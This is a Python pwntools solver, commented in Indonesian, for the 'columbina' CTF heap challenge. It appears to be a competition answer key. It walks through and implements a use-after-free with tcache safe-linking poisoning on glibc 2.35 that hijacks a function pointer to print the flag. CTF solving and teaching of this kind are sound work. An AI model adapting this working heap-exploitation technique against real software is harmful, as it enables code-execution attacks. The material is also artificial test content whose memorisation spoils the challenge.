#!/usr/bin/env python3
"""
Solver v2 untuk 'columbina' SETELAH binary dipatch (binary ke-2, diganti
oleh problem setter setelah solve pertama).

== Apa yang berubah dari binary lama ==
Diff `objdump -d` byte-per-byte (lihat WRITEUP_columbina_v2.md) nunjukin
CUMA satu perubahan logika: batas panjang baca di opsi 5 ("Luonnotar")
diperketat dari <=0x28 (40 byte) jadi <=0x10 (16 byte). Itu nutup jalur
lama (satu raw-write 40 byte langsung nimpa field print_fn di offset
0x20 lewat UAF+realloc chunk yang sama). Semua bug lain TIDAK berubah:
  - opsi 2 (free) masih TIDAK men-NULL-kan slot sesudah free() -> UAF
    tetap ada di slot manapun yang sudah di-free.
  - opsi 1 (Add) & opsi 5 (Luonnotar) masih SELALU malloc(0x28) --
    size class tcache-nya tetap identik dari dulu.
  - opsi 1 masih bocorin alamat heap tiap kali alokasi berhasil
    ("fragmen baru bersemayam di %p").

16 byte masih tidak cukup buat "lompat" dari offset tulis 0x00 sampai
field print_fn di offset 0x20 dalam SATU write. Primitive baru yang
dipakai: **tcache safe-linking poisoning** (glibc 2.35, dikonfirmasi
dari string version di libc.so.6 yang disertakan -- glibc >=2.32 selalu
pakai safe-linking buat pointer "next" tcache, bukan pointer polos).
Karena binary No-PIE + ada heap-leak gratis dari opsi 1, proteksi XOR
safe-link ini bisa dihitung balik langsung (mask = alamat_chunk >> 12).

== Alur ==
  1. Add slot0 -> leak A (TARGET: print_fn milik A yang mau dibajak,
     TIDAK PERNAH di-free supaya datanya tetap hidup)
  2. Add slot1 -> leak B (chunk korban #1, cuma filler)
  3. Add slot2 -> leak D (chunk korban #2, "next"-nya yang mau dikorup)
  4. Free slot1 (B masuk tcache(0x30), head=B)
  5. Free slot2 (D masuk tcache, head=D, count=2 -- WAJIB 2, biar nanti
     bisa 2x pop)
  6. Edit slot2 (opsi 3, raw read PERSIS 8 byte, short-read, sisa
     byte D TIDAK disentuh) -> timpa 8 byte pertama D ("next" tcache)
     dengan
         crafted = (D >> 12) ^ (A + 0x20)
     supaya waktu D di-pop nanti, head berikutnya "terdekode" jadi
     alamat PALSU FAKE = A + 0x20 -- persis di field print_fn-nya A.
  7. Add slot3 -> pop ke-1 dari tcache balikin D (legit, cuma buat
     majuin head ke FAKE). Isinya tidak penting, cuma supaya pop
     ke-2 kebagian giliran.
  8. Luonnotar(idx bebas 0-15, size=8, data=p64(WIN_FUNC)) -> pop ke-2
     balikin FAKE (=A+0x20) sebagai "chunk baru", lalu read() PERSIS
     8 byte ditulis di situ -- INI print_fn milik A.
  9. Uji otoritas fragmen (opsi 4) di slot0 -> entry=A,
     print_fn=*(A+0x20)=WIN_FUNC -> panggil WIN_FUNC(A) -> flag print.

Semua write di atas sengaja PERSIS N byte (short-read / short-send,
tanpa newline nyasar) supaya tidak nyenggol byte lain di luar target,
terutama header malloc chunk tetangga -- tidak perlu korupsi heap
metadata sama sekali.

Catatan implementasi: skrip ini sengaja TIDAK memakai `sendlineafter`
(recvuntil+send tergabung) untuk tiap langkah, tapi `sendline` lalu
`recvuntil` terpisah -- pola ini yang paling stabil waktu diuji
lewat relay WSL<->Windows di environment testing; kalau kamu jalankan
ini langsung di Linux/WSL ke `nc`, pola sendlineafter biasa juga akan
berfungsi.
"""
import re

from pwn import *

context.log_level = "info"
context.arch = "amd64"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 40601)

WIN_FUNC = 0x401347  # fungsi "print_win": puts(banner) + fputs(flag_buffer)


def protect_ptr(pos, ptr):
    """Safe-linking glibc >=2.32: PROTECT_PTR(pos, ptr) = (pos>>12) ^ ptr.
    Simetris, jadi dipakai sama buat encode maupun decode."""
    return (pos >> 12) ^ ptr


def add(io, idx, name):
    io.sendline(b"1")
    io.sendline(str(idx).encode())
    io.sendline(name)
    io.recvuntil(b"bersemayam di ")
    addr = int(io.recvline().strip().split()[0], 16)
    io.recvuntil(b"> ")
    return addr


def do_free(io, idx):
    io.sendline(b"2")
    io.sendline(str(idx).encode())
    io.recvuntil(b"> ")


def edit_raw(io, idx, data):
    """Opsi 3: raw read() PERSIS len(data) byte (short-read, sisa buffer
    chunk tidak tersentuh)."""
    io.sendline(b"3")
    io.sendline(str(idx).encode())
    io.recvuntil(b"raw): ")
    io.send(data)
    io.recvuntil(b"> ")


def call_fn(io, idx):
    io.sendline(b"4")
    io.sendline(str(idx).encode())


def luonnotar(io, idx2, data):
    io.sendline(b"5")
    io.sendline(str(idx2).encode())
    io.sendline(str(len(data)).encode())
    io.recvuntil(b"raw): ")
    io.send(data)  # read() raw PERSIS len(data) byte
    io.recvuntil(b"> ")


def solve(io):
    io.recvuntil(b"> ")

    # 1-3) tiga alokasi 0x28, tiap satu bocorin alamatnya sendiri
    A = add(io, 0, b"target")
    log.info(f"A (target chunk) = {hex(A)}")
    B = add(io, 1, b"filler1")
    log.info(f"B (sacrifice #1) = {hex(B)}")
    D = add(io, 2, b"filler2")
    log.info(f"D (sacrifice #2) = {hex(D)}")

    # 4-5) free B lalu D -> tcache(0x30): count=2, head=D, D->next decode ke B
    do_free(io, 1)
    do_free(io, 2)

    # 6) korupsi D->next (8 byte pertama D) supaya decode ke FAKE = A+0x20
    FAKE = A + 0x20
    crafted = protect_ptr(D, FAKE)
    edit_raw(io, 2, p64(crafted))
    log.info(f"FAKE target (A+0x20, print_fn-nya A) = {hex(FAKE)}")

    # 7) pop ke-1: balikin D (legit), cuma majuin head jadi FAKE
    add(io, 3, b"throwaway")

    # 8) pop ke-2: balikin FAKE, tulis PERSIS 8 byte = alamat WIN_FUNC
    #    pas di print_fn milik A
    luonnotar(io, 0, p64(WIN_FUNC))

    # 9) panggil print_fn milik A -> WIN_FUNC(A) -> print flag
    call_fn(io, 0)

    out = io.recvall(timeout=3).decode(errors="replace")
    m = re.search(r"TecFest26\{[^}]*\}", out)
    return m.group(0) if m else out


if __name__ == "__main__":
    io = remote(HOST, PORT, fam="ipv4")
    flag = solve(io)
    log.success(f"FLAG: {flag}")
    io.close()
